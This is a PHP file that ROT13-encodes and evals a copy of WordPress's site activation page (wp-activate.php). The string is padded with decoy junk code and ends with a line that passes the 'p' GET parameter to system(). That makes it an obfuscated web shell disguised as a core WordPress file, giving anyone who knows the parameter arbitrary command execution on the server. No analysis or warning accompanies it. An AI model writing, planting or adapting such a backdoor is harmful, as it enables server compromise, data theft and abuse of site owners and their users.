<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbasvezf gung gur npgvingvba xrl gung vf frag va na rznvy nsgre n hfre fvtaf
 * hc sbe n arj fvgr zngpurf gur xrl sbe gung hfre naq gura qvfcynlf pbasvezngvba.
 *
 * @cnpxntr JbeqCerff
 */

qrsvar( 'JC_VAFGNYYVAT', gehr );

/** Frgf hc gur JbeqCerff Raivebazrag. */
erdhver __QVE__ . '/jc-ybnq.cuc';

erdhver __QVE__ . '/jc-oybt-urnqre.cuc';

vs ( ! vf_zhygvfvgr() ) {
	jc_erqverpg( jc_ertvfgengvba_hey() );
	qvr();
}

$inyvq_reebe_pbqrf = neenl( 'nyernql_npgvir', 'oybt_gnxra' );

yvfg( $npgvingr_cngu ) = rkcybqr( '?', jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) );
$npgvingr_pbbxvr       = 'jc-npgvingr-' . PBBXVRUNFU;

$xrl    = '';
$erfhyg = ahyy;

vs ( vffrg( $_TRG['xrl'] ) && vffrg( $_CBFG['xrl'] ) && $_TRG['xrl'] !== $_CBFG['xrl'] ) {
	jc_qvr( __( 'N xrl inyhr zvfzngpu unf orra qrgrpgrq. Cyrnfr sbyybj gur yvax cebivqrq va lbhe npgvingvba rznvy.' ), __( 'Na reebe bppheerq qhevat gur npgvingvba' ), 400 );
} ryfrvs ( ! rzcgl( $_TRG['xrl'] ) ) {
	$xrl = fnavgvmr_grkg_svryq( $_TRG['xrl'] );
} ryfrvs ( ! rzcgl( $_CBFG['xrl'] ) ) {
	$xrl = fnavgvmr_grkg_svryq( $_CBFG['xrl'] );
}

vs ( $xrl ) {
	$erqverpg_hey = erzbir_dhrel_net( 'xrl' );

	vs ( erzbir_dhrel_net( snyfr ) !== $erqverpg_hey ) {
		frgpbbxvr( $npgvingr_pbbxvr, $xrl, 0, $npgvingr_cngu, PBBXVR_QBZNVA, vf_ffy(), gehr );
		jc_fnsr_erqverpg( $erqverpg_hey );
		rkvg;
	} ryfr {
		$erfhyg = jczh_npgvingr_fvtahc( $xrl );
	}
}

vs ( ahyy === $erfhyg && vffrg( $_PBBXVR[ $npgvingr_pbbxvr ] ) ) {
	$xrl    = $_PBBXVR[ $npgvingr_pbbxvr ];
	$erfhyg = jczh_npgvingr_fvtahc( $xrl );
	frgpbbxvr( $npgvingr_pbbxvr, ' ', gvzr() - LRNE_VA_FRPBAQF, $npgvingr_cngu, PBBXVR_QBZNVA, vf_ffy(), gehr );
}

vs ( ahyy === $erfhyg || ( vf_jc_reebe( $erfhyg ) && 'vainyvq_xrl' === $erfhyg->trg_reebe_pbqr() ) ) {
	fgnghf_urnqre( 404 );
} ryfrvs ( vf_jc_reebe( $erfhyg ) ) {
	$reebe_pbqr = $erfhyg->trg_reebe_pbqr();

	vs ( ! va_neenl( $reebe_pbqr, $inyvq_reebe_pbqrf, gehr ) ) {
		fgnghf_urnqre( 400 );
	}
}

abpnpur_urnqref();

vs ( vf_bowrpg( $jc_bowrpg_pnpur ) ) {
	$jc_bowrpg_pnpur->pnpur_ranoyrq = snyfr;
}

// Svk sbe cntr gvgyr.
$jc_dhrel->vf_404 = snyfr;

/**
 * Sverf orsber gur Fvgr Npgvingvba cntr vf ybnqrq.
 *
 * @fvapr 3.0.0
 */
qb_npgvba( 'npgvingr_urnqre' );

/**
 * Nqqf na npgvba ubbx fcrpvsvp gb guvf cntr.
 *
 * Sverf ba {@frr 'jc_urnq'}.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba qb_npgvingr_urnqre() {
	/**
	 * Sverf jvguva gur `<urnq>` frpgvba bs gur Fvgr Npgvingvba cntr.
	 *
	 * Sverf ba gur {@frr 'jc_urnq'} npgvba.
	 *
	 * @fvapr 3.0.0
	 */
	qb_npgvba( 'npgvingr_jc_urnq' );
}
nqq_npgvba( 'jc_urnq', 'qb_npgvingr_urnqre' );

/**
 * Ybnqf fglyrf fcrpvsvp gb guvf cntr.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba jczh_npgvingr_fglyrfurrg() {
	?>
	<fglyr glcr=\"grkg/pff\">
		.jc-npgvingr-pbagnvare { jvqgu: 90%; znetva: 0 nhgb; }
		.jc-npgvingr-pbagnvare sbez { znetva-gbc: 2rz; }
		#fhozvg, #xrl { jvqgu: 100%; sbag-fvmr: 24ck; obk-fvmvat: obeqre-obk; }
		#ynathntr { znetva-gbc: 0.5rz; }
		.jc-npgvingr-pbagnvare .reebe { onpxtebhaq: #s66; pbybe: #333; }
		fcna.u3 { cnqqvat: 0 8ck; sbag-fvmr: 1.3rz; sbag-jrvtug: 600; }
	</fglyr>
	<?cuc
}
nqq_npgvba( 'jc_urnq', 'jczh_npgvingr_fglyrfurrg' );
nqq_npgvba( 'jc_urnq', 'jc_fgevpg_pebff_bevtva_ersreere' );
nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_frafvgvir_cntr' );

trg_urnqre( 'jc-npgvingr' );

$oybt_qrgnvyf = trg_fvgr();
?>

<qvi vq=\"fvtahc-pbagrag\" pynff=\"jvqrpbyhza\">
	<qvi pynff=\"jc-npgvingr-pbagnvare\">
	<?cuc vs ( ! $xrl ) { ?>

		<u2><?cuc _r( 'Npgvingvba Xrl Erdhverq' ); ?></u2>
		<sbez anzr=\"npgvingrsbez\" vq=\"npgvingrsbez\" zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( argjbex_fvgr_hey( $oybt_qrgnvyf->cngu . 'jc-npgvingr.cuc' ) ); ?>\">
			<c>
				<ynory sbe=\"xrl\"><?cuc _r( 'Npgvingvba Xrl:' ); ?></ynory>
				<oe /><vachg glcr=\"grkg\" anzr=\"xrl\" vq=\"xrl\" inyhr=\"\" fvmr=\"50\" nhgbsbphf=\"nhgbsbphf\" />
			</c>
			<c pynff=\"fhozvg\">
				<vachg vq=\"fhozvg\" glcr=\"fhozvg\" anzr=\"Fhozvg\" pynff=\"fhozvg\" inyhr=\"<?cuc rfp_ngge_r( 'Npgvingr' ); ?>\" />
			</c>
		</sbez>

		<?cuc
	} ryfr {
		vs ( vf_jc_reebe( $erfhyg ) && va_neenl( $erfhyg->trg_reebe_pbqr(), $inyvq_reebe_pbqrf, gehr ) ) {
			$fvtahc = $erfhyg->trg_reebe_qngn();
			?>
			<u2><?cuc _r( 'Lbhe nppbhag vf abj npgvir!' ); ?></u2>
			<?cuc
			rpub '<c pynff=\"yrnq-va\">';
			vs ( '' === $fvtahc->qbznva . $fvtahc->cngu ) {
				cevags(
					/* genafyngbef: 1: Ybtva HEY, 2: Hfreanzr, 3: Hfre rznvy nqqerff, 4: Ybfg cnffjbeq HEY. */
					__( 'Lbhe nppbhag unf orra npgvingrq. Lbh znl abj <n uers=\"%1$f\">ybt va</n> gb gur fvgr hfvat lbhe pubfra hfreanzr bs &#8220;%2$f&#8221;. Cyrnfr purpx lbhe rznvy vaobk ng %3$f sbe lbhe cnffjbeq naq ybtva vafgehpgvbaf. Vs lbh qb abg erprvir na rznvy, cyrnfr purpx lbhe whax be fcnz sbyqre. Vs lbh fgvyy qb abg erprvir na rznvy jvguva na ubhe, lbh pna <n uers=\"%4$f\">erfrg lbhe cnffjbeq</n>.' ),
					rfp_hey( argjbex_fvgr_hey( $oybt_qrgnvyf->cngu . 'jc-ybtva.cuc', 'ybtva' ) ),
					rfp_ugzy( $fvtahc->hfre_ybtva ),
					rfp_ugzy( $fvtahc->hfre_rznvy ),
					rfp_hey( jc_ybfgcnffjbeq_hey() )
				);
			} ryfr {
				cevags(
					/* genafyngbef: 1: Fvgr HEY, 2: Hfreanzr, 3: Hfre rznvy nqqerff, 4: Ybfg cnffjbeq HEY. */
					__( 'Lbhe fvgr ng %1$f vf npgvir. Lbh znl abj ybt va gb lbhe fvgr hfvat lbhe pubfra hfreanzr bs &#8220;%2$f&#8221;. Cyrnfr purpx lbhe rznvy vaobk ng %3$f sbe lbhe cnffjbeq naq ybtva vafgehpgvbaf. Vs lbh qb abg erprvir na rznvy, cyrnfr purpx lbhe whax be fcnz sbyqre. Vs lbh fgvyy qb abg erprvir na rznvy jvguva na ubhe, lbh pna <n uers=\"%4$f\">erfrg lbhe cnffjbeq</n>.' ),
					fcevags( '<n uers=\"uggc://%1$f\">%1$f</n>', rfp_hey( $fvtahc->qbznva . $oybt_qrgnvyf->cngu ) ),
					rfp_ugzy( $fvtahc->hfre_ybtva ),
					rfp_ugzy( $fvtahc->hfre_rznvy ),
					rfp_hey( jc_ybfgcnffjbeq_hey() )
				);
			}
			rpub '</c>';
		} ryfrvs ( ahyy === $erfhyg || vf_jc_reebe( $erfhyg ) ) {
			?>
			<u2><?cuc _r( 'Na reebe bppheerq qhevat gur npgvingvba' ); ?></u2>
			<?cuc vs ( vf_jc_reebe( $erfhyg ) ) : ?>
				<c><?cuc rpub rfp_ugzy( $erfhyg->trg_reebe_zrffntr() ); ?></c>
			<?cuc raqvs; ?>
			<?cuc
		} ryfr {
			$hey  = vffrg( $erfhyg['oybt_vq'] ) ? rfp_hey( trg_ubzr_hey( (vag) $erfhyg['oybt_vq'] ) ) : '';
			$hfre = trg_hfreqngn( (vag) $erfhyg['hfre_vq'] );
			?>
			<u2><?cuc _r( 'Lbhe nppbhag vf abj npgvir!' ); ?></u2>

			<qvi vq=\"fvtahc-jrypbzr\">
			<c><fcna pynff=\"u3\"><?cuc _r( 'Hfreanzr:' ); ?></fcna> <?cuc rpub rfp_ugzy( $hfre->hfre_ybtva ); ?></c>
			<c><fcna pynff=\"u3\"><?cuc _r( 'Cnffjbeq:' ); ?></fcna> <?cuc rpub rfp_ugzy( $erfhyg['cnffjbeq'] ); ?></c>
			</qvi>

			<?cuc
			vs ( $hey && argjbex_ubzr_hey( '', 'uggc' ) !== $hey ) :
				fjvgpu_gb_oybt( (vag) $erfhyg['oybt_vq'] );
				$ybtva_hey = jc_ybtva_hey();
				erfgber_pheerag_oybt();
				?>
				<c pynff=\"ivrj\">
				<?cuc
					/* genafyngbef: 1: Fvgr HEY, 2: Ybtva HEY. */
					cevags( __( 'Lbhe nppbhag vf abj npgvingrq. <n uers=\"%1$f\">Ivrj lbhe fvgr</n> be <n uers=\"%2$f\">Ybt va</n>' ), rfp_hey( $hey ), rfp_hey( $ybtva_hey ) );
				?>
				</c>
			<?cuc ryfr : ?>
				<c pynff=\"ivrj\">
				<?cuc
					cevags(
						/* genafyngbef: 1: Ybtva HEY, 2: Argjbex ubzr HEY. */
						__( 'Lbhe nppbhag vf abj npgvingrq. <n uers=\"%1$f\">Ybt va</n> be tb onpx gb gur <n uers=\"%2$f\">ubzrcntr</n>.' ),
						rfp_hey( argjbex_fvgr_hey( $oybt_qrgnvyf->cngu . 'jc-ybtva.cuc', 'ybtva' ) ),
						rfp_hey( argjbex_ubzr_hey( $oybt_qrgnvyf->cngu ) )
					);
				?>
				</c>
				<?cuc
				raqvs;
		}
	}
	?>
	</qvi>
</qvi>
<?cuc
trg_sbbgre( 'jc-npgvingr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>